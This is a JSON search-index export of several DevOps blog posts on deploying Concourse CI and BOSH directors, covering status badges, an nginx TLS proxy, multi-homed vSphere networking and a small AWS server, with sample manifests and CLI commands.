13. (Optional) Publish the Release on GitHub and Update README.md Upload the tarball to GitHub to create a new GitHub Release. Update README.md if it refers to uploading the release\u0026rsquo;s tarball.\nFootnotes [Golang CLI] We are using an experimental Golang-based BOSH command line interface (CLI), and the arguments are slightly different than those of canonical Ruby-based BOSH CLI; however, the arguments are similar enough to be readily adapted to the Ruby CLI (e.g. the Golang CLI\u0026rsquo;s bosh upload-stemcell equivalent to the Ruby CLI\u0026rsquo;s bosh upload stemcell (no dash)).\nThe new CLI also allows variable interpolation, with the value of the variables to interpolate passed in via YAML file on the command line. This feature allows the redaction of sensitive values (e.g. SSL keys) from the manifest. The format is similar to Concourse\u0026rsquo;s interpolation, except that interpolated values are bracketed by double parentheses \u0026ldquo;((key))\u0026rdquo;, whereas Concourse uses double curly braces \u0026ldquo;{{key}}\u0026rdquo;.\nSimilar to Concourse, the experimental BOSH CLI allows the YAML file containing the secrets to be passed via the command line, e.g. -l ~/secrets.yml or -l \u0026lt;(lpass show --note secrets)\nThe Golang CLI is in alpha and should not be used on production systems.\nCorrection: December 17, 2016 The blog post has been updated to reflect the bosh create-release command\u0026rsquo;s option --tarball now requires an argument (the pathname of the release file to create). Previous versions of the BOSH CLI did not expect an argument passed to the --tarball option.\n","permalink":"https://blog.nono.io/post/updating-a-bosh-release/","summary":"When PowerDNS released version 4.0.1 of their authoritative nameserver, we rushed to update our BOSH Release (which was at version 4.0.0). We thought it would be a walk in the park, but instead it was an epic fail (a final release which couldn\u0026rsquo;t be deployed because the blobs were broken).\nIn this blog post we describe the procedure we ultimately followed to successfully create an updated BOSH final release of version 4.","title":"Updating a BOSH Release"},{"content":"The Concourse Continuous Integration (CI) server has an API endpoint that displays a badge which shows health of your project:\nhttp(s)://concourse-server/api/v1/pipelines/pipeline-name/jobs/job-name/badge\n0. Abstract Open Source projects that have CI (e.g. Bootstrap, Node.js) often feature status badges (also known as images or icons) to display the health of their projects. CI servers such as Travis CI offer status badges. Concourse CI also offers status badges.\nThe status badge is a Scalable Vector Graphics (SVG) image available from the Concourse API. [Concourse versions]\n1. Real World Example The sslip.io project has a Concourse CI pipeline consisting of one job.\nThe pipeline is sslip.io (same name as the project, a simple naming scheme), and the job\u0026rsquo;s name is check-dns.\nIn the project\u0026rsquo;s [README.md] (https://github.com/cunnie/sslip.io/blob/276311f219882c2d7228d271109f21c6e7b0698a/README.md), the following line displays the status badge and links to the Concourse server\u0026rsquo;s pipeline:\n[![ci.nono.io](https://ci.nono.io/api/v1/pipelines/sslip.io/jobs/check-dns/badge)](https://ci.nono.io/?groups=sslip.io) 2. It\u0026rsquo;s at the Job Level, not the Pipeline Level The badges display at the job level, which leads to a conundrum: which job best represents the health of the project?\nLet\u0026rsquo;s assume a simple pipeline with two jobs: unit and integration. The integration job is only run if the unit job has succeeded.\nA reasonable choice to represent the health of the project would be the integration job, but there is a problem: The integration job\u0026rsquo;s badge might show \u0026ldquo;passing\u0026rdquo; (that the code is good) when the unit tests have failed (see figure below). The badge would show the build as passing when in reality the build has failed:\nSimilarly with choosing the unit job to represent the health of the project: the unit job may have passed but the integration job may have failed. Again, the badge would show the build as passing when the build has failed.\nOne way to address this would be to display several badges, one for each job — Bootstrap has demonstrated that it\u0026rsquo;s reasonable to have more than one badge on a project\u0026rsquo;s page. [Bootstrap badges]\nFor example:\nJobStatus unit integration This begs the question: why not have badges at the pipeline level and not at the job level? The short answer is this: Concourse\u0026rsquo;s jobs have a status, but the pipelines don\u0026rsquo;t. The pipelines weren\u0026rsquo;t designed to have a status, and thus implementing a badge at the pipeline level is not a trivial task.\n3. The Five Types of Badges Badge Significance The most recent run of the job passed — you want this. The most recent run of the job failed. There is probably a bug in your code. You aborted the most recent run of the job; maybe it was stuck. The job has never been run. Concourse ran into an error and couldn\u0026rsquo;t complete the job. Acknowledgements Chris Brown wrote much of the code during his lunch hour. Kris Hicks shepherded the pull request through the acceptance process, refashioning the code along the way. He also reviewed this post. Any excellence is theirs, gnarliness, mine.\nshields.io was used to generate the initial badges.\nAssets A pipeline that displays all five types of badges, and its YAML.\nA pipeline that has two jobs (unit and integration), and its YAML.\nFootnotes [Concourse versions]The badge API endpoint was added in Concourse v1.3.0.\nThe badge API endpoint was changed briefly in v2.0.0 and then reverted in v2.0.1.\nIf your server is v2.0.0, this is the API endpoint:\nhttp(s)://concourse-server/api/v1/teams/main/pipelines/pipeline-name/jobs/job-name/badge\n[Bootstrap badges]An open source developer once remarked, \u0026ldquo;Bootstrap\u0026rsquo;s project page has more badges than a Third World General!\u0026rdquo;\nWe\u0026rsquo;d like to commend the Bootstrap developers for their commitment to CI, cross-platform compatibility, and just about everything that makes an open source project successful — they\u0026rsquo;ve set a high bar to which all of us aspire.\n","permalink":"https://blog.nono.io/post/concourse-badges/","summary":"The Concourse Continuous Integration (CI) server has an API endpoint that displays a badge which shows health of your project:\nhttp(s)://concourse-server/api/v1/pipelines/pipeline-name/jobs/job-name/badge\n0. Abstract Open Source projects that have CI (e.g. Bootstrap, Node.js) often feature status badges (also known as images or icons) to display the health of their projects. CI servers such as Travis CI offer status badges. Concourse CI also offers status badges.\nThe status badge is a Scalable Vector Graphics (SVG) image available from the Concourse API.","title":"Concourse has Badges"},{"content":"Abstract Concourse is a continuous integration (CI) server. It can be deployed manually or via BOSH.\nIn this blog post, we describe the BOSH deployment of a Concourse CI server to natively accept Secure Sockets Layer (SSL) connections without using a load balancer. This may reduce the complexity and cost [ELB-pricing] of a Concourse deployment.\n2016-09-12: This blog post is obsolete. Newer (v2.0.0+) versions of Concourse allow binding to the privileged ports 80 and 443, eliminating the need for an nginx proxy. Here is an example of a BOSH-deployed Concourse server that binds natively to ports 80 \u0026 443: BOSH manifest. 0. Pre-requisites Deploy Concourse with BOSH. Follow the instructions here.\n1. Upload nginx BOSH Release Next, upload the nginx BOSH release to your director (note that we\u0026rsquo;re using an experimental CLI whose syntax is slightly different [Golang CLI] ):\nbosh upload-release https://github.com/cloudfoundry-community/nginx-release/releases/download/v4/nginx-4.tgz 2. Add nginx to your BOSH manifest Add the release:\nreleases: - name: nginx version: latest Add the nginx job properties.\nThe following example shows the manifest properties for https://ci.nono.io. Be sure to replace all occurrences of \u0026ldquo;ci.nono.io\u0026rdquo; with the fully qualified domain name (FQDN) of your Concourse server. Also, substitute the appropriate SSL certificate(s) and key.\n- name: nginx release: nginx properties: nginx_conf: | worker_processes 1; error_log /var/vcap/sys/log/nginx/error.log info; events { worker_connections 1024; } http { include /var/vcap/packages/nginx/conf/mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; server_names_hash_bucket_size 64; # redirect HTTP to HTTPS server { server_name _; # invalid value which will never trigger on a real hostname. listen 80; rewrite ^ https://ci.nono.io$request_uri?; access_log /var/vcap/sys/log/nginx/ci.nono.io-access.log; error_log /var/vcap/sys/log/nginx/ci.nono.io-error.log; } server { server_name ci.nono.io; # weak DH https://weakdh.org/sysadmin.html ssl_ciphers \u0026#39;ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA256:AES256-SHA256:AES128-SHA:AES256-SHA:AES:CAMELLIA:DES-CBC3-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!aECDH:!EDH-DSS-DES-CBC3-SHA:!EDH-RSA-DES-CBC3-SHA:!KRB5-DES-CBC3-SHA\u0026#39;; ssl_prefer_server_ciphers on; # poodle https://scotthelme.co.uk/sslv3-goes-to-the-dogs-poodle-kills-off-protocol/ ssl_protocols TLSv1 TLSv1.1 TLSv1.2; listen 443 ssl; ssl_certificate /var/vcap/jobs/nginx/etc/ssl_chained.crt.pem; ssl_certificate_key /var/vcap/jobs/nginx/etc/ssl.key.pem; access_log /var/vcap/sys/log/nginx/ci.nono.io-access.log; error_log /var/vcap/sys/log/nginx/ci.nono.io-error.log; root /var/vcap/jobs/nginx/www/document_root; index index.shtml index.html index.htm; # https://www.digitalocean.com/community/tutorials/how-to-configure-nginx-with-ssl-as-a-reverse-proxy-for-jenkins location / { proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; # Fix `websocket: bad handshake` when using `fly intercept` proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection \u0026#34;upgrade\u0026#34;; # Fix the “It appears that your reverse proxy set up is broken\u0026#34; error. proxy_pass http://localhost:8080; proxy_read_timeout 90; proxy_redirect http://localhost:8080 https://ci.nono.io; } } } # FIXME: replace with your HTTPS SSL key ssl_key: ((nono_io_key)) # FIXME: replace with your HTTPS SSL chained certificate ssl_chained_cert: | -----BEGIN CERTIFICATE----- MIIFXDCCBESgAwIBAgIQOvRHkhKyb/k9O4xvIi9zZTANBgkqhkiG9w0BAQsFADCB ... NaaNSyS8pHUJhaq+ZiC7zM2YsuLBICPQfsunHGrho4k= -----END CERTIFICATE----- -----BEGIN CERTIFICATE----- MIIGCDCCA/CgAwIBAgIQKy5u6tl1NmwUim7bo3yMBzANBgkqhkiG9w0BAQwFADCB ... +AZxAeKCINT+b72x -----END CERTIFICATE----- -----BEGIN CERTIFICATE----- MIIFdDCCBFygAwIBAgIQJ2buVutJ846r13Ci/ITeIjANBgkqhkiG9w0BAQwFADBv ... pu/xO28QOG8= -----END CERTIFICATE----- 3. BOSH Deploy We deploy (note that we are using an experimental BOSH CLI whose syntax differs slightly from the canonical Ruby CLI\u0026rsquo;s):\nbosh deploy -d concourse concourse.yml -l \u0026lt;(lpass show --note deployments) We browse to our newly-deployed Concourse server to verify an SSL connection: https://ci.nono.io\n4. Manifests Concourse server + nginx front-end BOSH manifest BOSH Director Cloud Config manifest BOSH Director manifest [Google Cloud] Addendum: Using Concourse\u0026rsquo;s Built-in TLS instead of nginx Concourse has BOSH job properties that allow you to set the TLS key and certificate, bypassing the need for a colocated nginx job:\ninstance_groups: jobs: atc: properties: tls_cert: | -----BEGIN CERTIFICATE----- MIIFXDCCBESgAwIBAgIQOvRHkhKyb/k9O4xvIi9zZTANBgkqhkiG9w0BAQsFADCB ... NaaNSyS8pHUJhaq+ZiC7zM2YsuLBICPQfsunHGrho4k= -----END CERTIFICATE----- -----BEGIN CERTIFICATE----- MIIGCDCCA/CgAwIBAgIQKy5u6tl1NmwUim7bo3yMBzANBgkqhkiG9w0BAQwFADCB .... pu/xO28QOG8= -----END CERTIFICATE----- tls_key: | -----BEGIN RSA PRIVATE KEY----- This simple solution has a downside: the Concourse URI\u0026rsquo;s requires a port number at the end (e.g. the URI would be https://ci.nono.io:4443 instead of https://ci.nono.io). [privileged]\nHere is a sample BOSH manifest which uses Concourse\u0026rsquo;s built-in TLS.\nFootnotes [ELB-pricing] ELB pricing, as of this writing, is $0.025/hour, $0.60/day, $219.15 / year (assuming 365.24 days / year).\nLoad balancers (specifically ELBs) offer the ability to direct traffic to a pool of backend servers and to automatically remove a server from the pool if it becomes unresponsive; however, this feature is often unneeded — we are unaware of any Concourse server deployments which have multiple backends. A load balancer in front of a Concourse server is an unnecessary expense in our opinion.\n[Golang CLI] We are using an experimental Golang-based BOSH command line interface (CLI), and the arguments are slightly different than those of canonical Ruby-based BOSH CLI; however, the arguments are similar enough to be readily adapted to the Ruby CLI (e.g. the Golang CLI\u0026rsquo;s bosh upload-stemcell equivalent to the Ruby CLI\u0026rsquo;s bosh upload stemcell (no dash)).\nThe new CLI also allows variable interpolation, with the value of the variables to interpolate passed in via YAML file on the command line. This feature allows the redaction of sensitive values (e.g. SSL keys) from the manifest. The format is similar to Concourse\u0026rsquo;s interpolation, except that interpolated values are bracketed by double parentheses \u0026ldquo;((key))\u0026rdquo;, whereas Concourse uses double curly braces \u0026ldquo;{{key}}\u0026rdquo;.\nSimilar to Concourse, the experimental BOSH CLI allows the YAML file containing the secrets to be passed via the command line, e.g. -l ~/secrets.yml or -l \u0026lt;(lpass show --note secrets)\nThe Golang CLI is in alpha and should not be used on production systems.\n[Google Cloud] We are deploying to Google Cloud Platform\u0026rsquo;s Google Compute Engine (GCE), and thus the cloud_properties sections of the BOSH Director\u0026rsquo;s manifest may appear unfamiliar to those who deploy on AWS or vSphere.\n[privileged] Concourse will not bind to a privileged port.\nYou may attempt to force atc to bind to port 443 by setting its tls_bind_port job property, but it will not work, atc will not start, and you will see the following message in /var/vcap/sys/log/atc/atc.stderr.log:\nweb-tls exited with error: listen tcp 0.0.0.0:443: bind: permission denied ","permalink":"https://blog.nono.io/post/concourse-no-elb/","summary":"Abstract Concourse is a continuous integration (CI) server. It can be deployed manually or via BOSH.\nIn this blog post, we describe the BOSH deployment of a Concourse CI server to natively accept Secure Sockets Layer (SSL) connections without using a load balancer. This may reduce the complexity and cost [ELB-pricing] of a Concourse deployment.\n2016-09-12: This blog post is obsolete. Newer (v2.0.0+) versions of Concourse allow binding to the privileged ports 80 and 443, eliminating the need for an nginx proxy.","title":"Concourse without a Load Balancer"},{"content":"vSphere users ask, \u0026ldquo;How do I configure my BOSH director so that it can communicate with my vCenter but the director\u0026rsquo;s deployed VMs can\u0026rsquo;t?\u0026rdquo;\nOne technique is to use a multi-homed BOSH director combined with the BOSH Networking Release (a BOSH release which enables customization of the VM\u0026rsquo;s routing table, allowing more routes than the default gateway).\nNetwork Diagram The following is a network diagram of our deployment. We want to protect the assets at the top (in blue): the vCenter server and its associated ESXi servers. These machines are particularly sensitive as they control hundreds of VMs.\nThe BOSH Director needs access to the vCenter, but its deployed VMs must not have access to the vCenter.\nWe provision BOSH as a multi-homed VM attached to both the vCenter management network and the BOSH Routing Network. This allows the director to communicate with the deployed VMs, but prevents the VMs from communicating with the sensitive networks.\nBOSH Deployment Manifest We use a BOSH v2 deployment manifest and a cloud config to deploy our BOSH director. Here is our BOSH director\u0026rsquo;s manifest:\ndirector_uuid: __DIRECTOR_UUID__ name: bosh releases: - name: bosh version: latest - name: bosh-vsphere-cpi version: latest - name: networking version: latest stemcells: - alias: default os: ubuntu-trusty version: latest update: canaries: 1 max_in_flight: 10 canary_watch_time: 1000-30000 update_watch_time: 1000-30000 jobs: - name: bosh instances: 1 stemcell: default templates: - {name: nats, release: bosh} - {name: postgres, release: bosh} - {name: blobstore, release: bosh} - {name: director, release: bosh} - {name: health_monitor, release: bosh} - {name: vsphere_cpi, release: bosh-vsphere-cpi} - name: routes release: networking properties: # This customizes the BOSH Director\u0026#39;s networking.routes: # routing table so it can reach - net: 172.16.1.0 # the two networks to which it deploys netmask: 255.255.255.0 # VMs: interface: eth1 # - CF Public Network (172.16.1.0/24) gateway: 172.16.0.1 # - CF Private Network (172.16.2.0/24) - net: 172.16.2.0 netmask: 255.255.255.0 interface: eth1 gateway: 172.16.0.1 vm_type: medium persistent_disk: 40_960 networks: - {name: bosh-management-network, static_ips: [10.0.1.6], default: [dns,gateway]} - {name: bosh-routing-network, static_ips: [172.16.0.6]} properties: nats: address: 127.0.0.1 user: nats password: nats-password postgres: \u0026amp;db listen_address: 127.0.0.1 host: 127.0.0.1 user: postgres password: postgres-password database: bosh adapter: postgres blobstore: address: 172.16.0.6 port: 25250 provider: dav director: {user: director, password: director-password} agent: {user: agent, password: agent-password} director: address: 127.0.0.1 name: my-bosh db: *db cpi_job: vsphere_cpi user_management: provider: local local: users: - {name: admin, password: admin} - {name: hm, password: hm-password} hm: director_account: {user: hm, password: hm-password} resurrector_enabled: true vcenter: \u0026amp;vcenter # \u0026lt;--- Replace values below address: 10.0.0.5 user: root password: vmware datacenters: - name: datacenter vm_folder: vms template_folder: templates datastore_pattern: vnx5400-ds persistent_datastore_pattern: vnx5400-ds disk_path: disk clusters: [pizza-boxes] agent: {mbus: \u0026#34;nats://nats:nats-password@172.16.0.6:4222\u0026#34;} ntp: \u0026amp;ntp [0.pool.ntp.org, 1.pool.ntp.org] Note that properties.blobstore.address and properties.agent.mbus use the BOSH director\u0026rsquo;s interface that is closest to its deployed VMs (i.e. 172.16.0.6); if you use the other interface (i.e. 10.0.1.6), the VMs will not be able to contact the director and the deployment will fail.\nHere is our cloud-config manifest:\nnetworks: - name: bosh-management-network subnets: - range: 10.0.1.0/24 gateway: 10.0.1.1 static: - 10.0.1.6 cloud_properties: { name: bosh-management-network } - name: bosh-routing-network subnets: - range: 172.16.0.0/24 gateway: 172.16.0.1 static: - 172.16.0.6 cloud_properties: { name: bosh-routing-network } - name: cf-public-network subnets: - range: 172.16.1.0/24 gateway: 172.16.1.1 cloud_properties: { name: cf-public-network } vm_types: - name: tiny cloud_properties: { cpu: 1, ram: 1024, disk: 1024 } - name: medium cloud_properties: { cpu: 2, ram: 2048, disk: 81_920 } compilation: workers: 6 network: bosh-management-network reuse_compilation_vms: true cloud_properties: { cpu: 2, ram: 2048, disk: 1024 } Here is our deployment manifest (a very simple deployment):\nname: simple director_uuid: __BOSH_DIRECTOR_UUID__ releases: [] stemcells: - alias: default os: ubuntu-trusty version: latest update: canaries: 1 max_in_flight: 1 canary_watch_time: 5000-300000 update_watch_time: 5000-300000 instance_groups: - name: simple-vm instances: 1 jobs: [] vm_type: tiny stemcell: default networks: - name: cf-public-network Notes If one were to dispense with the BOSH Routing Network and deploy VMs on the same subnet to which the BOSH director is attached, then one would not need to include the BOSH Networking Release in the BOSH manifest (the BOSH will not need to traverse a router to reach its deployed VMs, for the VMs will be deployed to the same subnet on which the director has an interface).\nMore complex BOSH deployments, e.g. Cloud Foundry Elastic Runtime, typically assume multiple subnets, requiring the use of the networking-release.\nWe use BOSH v2 deployment manifest and cloud config to deploy our BOSH director; however, BOSH directors are most often deployed with bosh-init, which uses a slightly different manifest format. It should be a fairly trivial exercise to convert our manifests to a bosh-init-flavored manifest.\nGotchas BOSH stemcells have been hardened, and this may cause unexpected connectivity issues. Specifically, asymmetric routing may cause pings (or other attempts to connect) to one of the Director\u0026rsquo;s interfaces to fail (pings to the other interface should succeed).\nThis problem is caused by reverse packet filtering. To fix, one can enable the Director\u0026rsquo;s kernel to accept asymmetrically routed packets (the following commands must be run as root):\necho 2 \u0026gt; /proc/sys/net/ipv4/conf/default/rp_filter echo 2 \u0026gt; /proc/sys/net/ipv4/conf/all/rp_filter echo 2 \u0026gt; /proc/sys/net/ipv4/conf/eth0/rp_filter echo 2 \u0026gt; /proc/sys/net/ipv4/conf/eth1/rp_filter To make the changes permanent (to persist on reboot), the following should be added to /etc/sysctl.conf:\nnet.ipv4.conf.all.rp_filter=2 net.ipv4.conf.default.rp_filter=2 net.ipv4.conf.eth0.rp_filter=2 net.ipv4.conf.eth1.rp_filter=2 ","permalink":"https://blog.nono.io/post/multi-homed-bosh-director/","summary":"vSphere users ask, \u0026ldquo;How do I configure my BOSH director so that it can communicate with my vCenter but the director\u0026rsquo;s deployed VMs can\u0026rsquo;t?\u0026rdquo;\nOne technique is to use a multi-homed BOSH director combined with the BOSH Networking Release (a BOSH release which enables customization of the VM\u0026rsquo;s routing table, allowing more routes than the default gateway).\nNetwork Diagram The following is a network diagram of our deployment. We want to protect the assets at the top (in blue): the vCenter server and its associated ESXi servers.","title":"How to Deploy a Multi-homed BOSH Director to a vSphere Environment"},{"content":"[2016-04-06: This Blog Post is out-of-date; Please refer to the official Concourse documentation for instructions how to install a Concourse server] Continuous Integration (CI) is often used in conjunction with test-driven development (TDD); however, CI servers often bring their own set of challenges: they are usually \u0026ldquo;snowflakes\u0026rdquo;, uniquely configured machines that are difficult to upgrade, re-configure, or re-install. [snowflakes]\nIn this blog post, we describe deploying a publicly-accessible, lean (1GB RAM, 1 vCPU, 15GB disk) Concourse CI server using a 350-line manifest. Upgrades/re-configurations/re-installs are as simple as editing a file and typing one command (bosh-init).\nWe must confess to sleight-of-hand: although we describe deploying a CI server, the worker is too lean to run any but the smallest tests. The deployed CI Server we describe can\u0026rsquo;t run large tests.\nWe will address that shortcoming in a future blog post where we describe the manual provisioning of local workers. The process isn\u0026rsquo;t difficult, but including it would have made the blog post undesirably long.\n0. Set Up the Concourse Server In the following steps, we demonstrate creating a Concourse CI server, ci.blabbertabber.com for our open source Android project, BlabberTabber.\n0.0 Prepare an AWS Account We follow the bosh.io instructions [AWS tooling] to prepare our AWS account.\nAfter we have completed this step, we have the information we need to populate our BOSH deployment\u0026rsquo;s manifest:\nAccess Key ID, e.g. AKIAxxxxxxxxxxxxxxxx Secret Access Key, e.g. 0+B1XW6VVxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx Availability Zone, e.g. us-east-1a Region, e.g. us-east-1 Elastic IP, e.g. 52.23.10.10 Subnet ID, e.g. subnet-1c90ef6b Key Pair Name, e.g. bosh, aws_nono Key Pair Path, e.g. ~/my-bosh/bosh.pem, ~/.ssh/aws_nono.pem 0.1 Create the concourse Security Group Although we created an AWS Security Group in the previous step, it doesn\u0026rsquo;t suit our purposes—we need to open the ports for HTTP (80) and HTTPS (443). We create a concourse Security Group via the Amazon AWS Console:\nVPC → Security Groups\nclick Create Security Group\nName tag: concourse Description: Rules for accessing Concourse CI server VPC: select the VPC in which you created in the previous step click Yes, Create click Inbound Rules tab\nclick Edit\nadd the following rules:\nType of Traffic Protocol Port Range Source IP CIDR Notes SSH (22) TCP (6) 22 0.0.0.0/0 debugging, agents HTTP (80) TCP (6) 80 0.0.0.0/0 redirect HTTPS (443) TCP (6) 443 0.0.0.0/0 web Custom TCP Rule TCP (6) 2222 0.0.0.0/0 agents Custom TCP Rule TCP (6) 6868 0.0.0.0/0 bosh-init click Save\n0.2 Obtain SSL Certificates We decide to use HTTPS to communicate with our Concourse server, for we will need to authenticate against the webserver when we configure our CI (when we transmit our credentials over the Internet we want them to be encrypted).\nWe purchase valid SSL certificates for our server [Let\u0026rsquo;s Encrypt] . Using a self-signed certificate is also an option.\nWe use the following command to create our key and CSR. Note that you should substitute your information where appropriate, especially for the CN (Common Name), i.e. don\u0026rsquo;t use ci.blabbertabber.com.\nopenssl req -new \\ -keyout ci.blabbertabber.com.key \\ -out ci.blabbertabber.com.csr \\ -newkey rsa:4096 -sha256 -nodes \\ -subj \u0026#39;/C=US/ST=California/L=San Francisco/O=blabbertabber.com/OU=/CN=ci.blabbertabber.com/emailAddress=brian.cunnie@gmail.com\u0026#39; We submit the CSR to our vendor, authorize the issuance of the certificate, and receive our certificate, which we will place in our manifest (along with the key and the CA certificate chain).\nWe configure a DNS A record for our concourse server to point to our AWS Elastic IP. We have the following line in our blabbertabber.com zone file:\nci.blabbertabber.com. A 52.23.10.10 0.3 Create Private SSH Key for Remote workers We create a private ssh key for our remote worker:\nssh-keygen -P \u0026#39;\u0026#39; -f ~/.ssh/worker_key We will use the public key in the next step, when we create our BOSH manifest.\n0.4 Create BOSH Manifest We create the BOSH manifest for our Concourse server by doing the following:\ndownload the redacted (passwords \u0026amp; keys removed) BOSH manifest open it in an editor search for every occurrence of FIXME update the field described by the FIXME, e.g. update the IP address, set the password, set the Subnet ID, etc\u0026hellip;. For those interested, our sample Concourse manifest was derived from Concourse\u0026rsquo;s official sample bosh-init manifest and modified as follows:\nadded an nginx release to provide SSL termination (i.e. HTTPS) while bypassing the need for an ELB ($219.14/year [ELB-pricing] ). This was also why we enabled ports 80 and 443 in our AWS Security Group. added a postgres job and configured our Concourse server to use that instead of Amazon RDS in order to eliminate RDS charges, but we suspect the savings to be insignificant. configured the web interface to be publicly-viewable but require authorization to make changes added our remote worker\u0026rsquo;s public key to jobs.properties.tsa.authorized_keys 0.5 Deploy the Concourse Server We install bosh-init by following these instructions.\nWe use bosh-init to deploy Concourse using the manifest we created in the previous step. In the following example, our manifest is named concourse-aws.yml:\nbosh-init deploy concourse-aws.yml ... Finished deploying (00:12:15) Stopping registry... Finished (00:00:00) Cleaning up rendered CPI jobs... Finished (00:00:00) A deployment takes ~12 minutes.This gist contains the complete output of the bosh-init deployment.\n0.6 Verify Deployment and Download Concourse CLI We browse to https://ci.blabbertabber.com.\nWe download the fly CLI by clicking on the Apple icon (assuming that your workstation is an OS X machine) and move it into place:\ninstall ~/Downloads/fly /usr/local/bin 0.7 Create Hello World Concourse job We follow Concourse\u0026rsquo;s Getting Started instructions to create our first pipeline. We add tags [ \u0026quot;micro\u0026quot; ] to the sample Concourse pipeline so that the job is run on our \u0026ldquo;micro\u0026rdquo; worker (in our BOSH manifest, we tag the worker that is colocated on our t2.micro Concourse server \u0026ldquo;micro\u0026rdquo; so that we can steer small jobs to it).\ncat \u0026gt; hello-world.yml \u0026lt;\u0026lt;EOF jobs: - name: hello-world plan: - task: say-hello config: platform: linux image: \u0026#34;docker:///ubuntu\u0026#34; tags: [ \u0026#34;micro\u0026#34; ] run: path: echo args: [\u0026#34;Hello, world!\u0026#34;] EOF We configure the pipeline (remember to substitute the username and password in the manifest, jobs.properties.atc.basic_auth_username and jobs.properties.atc.basic_auth_password, for \u0026ldquo;user:password\u0026rdquo; below):\nfly -t \u0026#34;https://user:password@ci.blabbertabber.com\u0026#34; set-pipeline -p really-cool-pipeline -c hello-world.yml You can see the gist of the output here.\nType y when prompted to apply the configuration.\n0.8 Browse to Concourse and Kick off Job Refresh https://ci.blabbertabber.com to see our newly-created pipeline:\nNext we unpause the job\nclick the \u0026ldquo;≡\u0026rdquo; (hamburger) in the upper left hand corner click the \u0026ldquo;▶\u0026rdquo; (play button) that appears below the hamburger. This will un-pause our pipeline and allow builds to run. click Log in with Basic Auth authenticate with the atc\u0026rsquo;s account and password (these can be found in the manifest, jobs.properties.atc.basic_auth_username and jobs.properties.atc.basic_auth_password) click the \u0026ldquo;≡\u0026rdquo; (hamburger) in the upper left hand corner (yes, again) click the \u0026ldquo;▶\u0026rdquo; (play button) that appears below the hamburger. The banner at the top of the screen will switch from light-blue to black. The page should look like this: 0.9 Our First Integration Test: Hello World We kick off our job:\nclick the hello-world rectangle in the middle of the screen. click the \u0026ldquo;⊕\u0026rdquo; button in the upper right hand side of the screen We see that the job completes successfully by the pea-green color. We click \u0026ldquo;\u0026gt;_ say-hello\u0026rdquo; to see the output:\n1.0 Conclusion We have demonstrated with the ease with which one can deploy a CI server using a combination of Concourse and bosh-init, a deployment which takes less than a quarter hour from start (no disk, no OS) to finish (a publicly-accessible, up-and-running CI server) and which is easily re-deployed.\nWe recognize that our deployment is incomplete, that it lacks the workers necessary to run jobs of any consequence. We will describe how to manually provision workers in our next blog post.\nOne of the benefits of the Concourse/bosh-init combination is that Concourse stores its state on a persistent disk, so that re-deploying the CI server (e.g. new OS, new Concourse) won\u0026rsquo;t cause the loss of the pipeline configuration or build history.\nAppendix A. Concourse Yearly Costs: $80.34 The yearly cost of running a Concourse server is $80.34. Note that this does not include the cost of the worker. Had we chosen to implement the recommended m3.large EC2 instance for a worker, it would have increased our yearly cost by $713.54 [m3.large] .\nHere are our costs:\nExpense Vendor Cost Cost / year ci.blabbertabber.com cert cheapsslshop.com $14.85 3-year [inexpensive-SSL] $4.95 EC2 t2.micro instance Amazon AWS $0.0086 / hour [t2.micro] $75.39 Footnotes [snowflakes] Even the most innocuous changes to a CI server can be fraught with anxiety: two years ago when we were migrating one of our development team\u0026rsquo;s Jenkins CI server VM from one datastore to another (a very low-risk operation), we needed to have several meetings with the Team\u0026rsquo;s product manager and the anchor before they were willing to allow us to proceed with the migration.\n[AWS Tooling] We appreciate that creating the AWS infrastructure (VPC, Elastic IP, Key Pair) is tedious and a bit of a clickfest. We\u0026rsquo;re working to make this much easier, soon. Per Rob Dimsdale, \u0026ldquo;the MEGA team is actively working on tooling to improve the user-experience of creating the AWS stack for Concourse, but we\u0026rsquo;re not ready for public consumption of that tooling just yet.\u0026rdquo; Stay tuned.\n[Let\u0026rsquo;s Encrypt] Let\u0026rsquo;s Encrypt is a \u0026ldquo;free, automated, and open\u0026rdquo; Certificate Authority which issues valid SSL certificates free of charge. We are eagerly awaiting its launch, which hopefully will happen within the next few weeks.\n[ELB-pricing] ELB pricing, as of this writing, is $0.025/hour, $0.60/day, $219.1455 / year (assuming 365.2425 days / year).\n[m3.large] Amazon effectively charges $0.0814/hour for a 1 year term all-upfront m3.large reserved instance.\n[inexpensive-SSL] One shouldn\u0026rsquo;t pay more than $25 for a 3-year certificate. We used SSLSHOP to purchase our Comodo Positive SSL, but there are many good SSL vendors, and we don\u0026rsquo;t endorse one over the other.\n[t2.micro] Amazon effectively charges $0.0086/hour for a 1 year term all-upfront t2.micro reserved instance.\n","permalink":"https://blog.nono.io/post/worlds-smallest-concourse-server/","summary":"[2016-04-06: This Blog Post is out-of-date; Please refer to the official Concourse documentation for instructions how to install a Concourse server] Continuous Integration (CI) is often used in conjunction with test-driven development (TDD); however, CI servers often bring their own set of challenges: they are usually \u0026ldquo;snowflakes\u0026rdquo;, uniquely configured machines that are difficult to upgrade, re-configure, or re-install. [snowflakes]\nIn this blog post, we describe deploying a publicly-accessible, lean (1GB RAM, 1 vCPU, 15GB disk) Concourse CI server using a 350-line manifest.","title":"The World's Smallest Concourse CI Server"}]